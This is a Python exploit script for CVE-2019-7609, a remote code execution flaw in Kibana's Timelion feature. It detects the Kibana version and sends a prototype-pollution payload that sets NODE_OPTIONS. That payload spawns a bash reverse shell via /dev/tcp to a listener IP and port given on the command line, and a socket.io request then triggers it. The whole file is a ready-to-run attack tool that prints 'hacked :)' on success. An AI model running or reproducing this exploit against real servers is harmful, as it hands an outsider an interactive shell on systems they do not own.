import argparse
import requests
import re
import sys
import random
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2019-7609
# kibana RCE.
class CVE2019_7609:
    headers = {
        "User-Agent" : "Mozilla/5.0",
        "Content-Type": "application/json;charset=utf-8",
    }

    def __init__(self, url, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # get kibana version
    def get_version(self):
        print (LogColors.BLUE + "get kibana version..." + LogColors.ENDC)
        headers = {
            "User-Agent" : "Mozilla/5.0",
            "Referer" : self.url,
        }
        try:
            r = self.session.get(self.url + "/app/kibana/", verify = False, headers = headers)
        except Exception as e:
            print (LogColors.RED + "failed parse version :(" + LogColors.ENDC)
            sys.exit()
        else:
            patterns = ['&quot;version&quot;:&quot;(.*?)&quot;,', '"version":"(.*?)",']
            for pattern in patterns:
                match = re.findall(pattern, r.text)
                if match:
                    print (LogColors.YELLOW + str(match[0]) + LogColors.ENDC)
                    self.version = str(match[0])
                    return True
            self.version = '9.9.9'
            return False

    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        rand = "".join(random.sample('qwertyuiopasdfghjkl', 8))
        self.headers = {
            #'Referer' : self.url,
            'Content-Type': 'application/json;charset=utf-8',
            'kbn-version': self.version,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
        }

        shell = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\")'''
        shell += r'''.exec(\"if [ ! -f /tmp/{} ];then touch /tmp/{} && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/{}/{} 0>&1\\'; fi\");process.exit()//')\n'''.format(rand, rand, self.lhost, self.lport)
        shell += r'''.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}'''
        
        try:
            r = requests.post(self.url + "/api/timelion/run", data = shell, verify = False, timeout = 20)
        except Exception as e:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed send payload. code: " + r.status_code + LogColors.ENDC)
                sys.exit()

    # trigger reverse shell
    def trigger_revshell(self):
        print (LogColors.BLUE + "trigger rev shell..." + LogColors.ENDC)
        self.headers.update({'kbn-xsrf': 'professionally-crafted-string-of-text'})
        r = self.session.get(self.url + "/socket.io/?EIO=3&transport=polling&t=MtjhZoM", verify = False)
        if r.ok:
            print (LogColors.GREEN + "rev shell successfully triggered :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "trigger reverse shell failed :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.get_version()
        self.send_payload()
        self.trigger_revshell()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    ip, port = args['ip'], args['port']
    cve = CVE2019_7609(url, ip, port)
    cve.exploit()

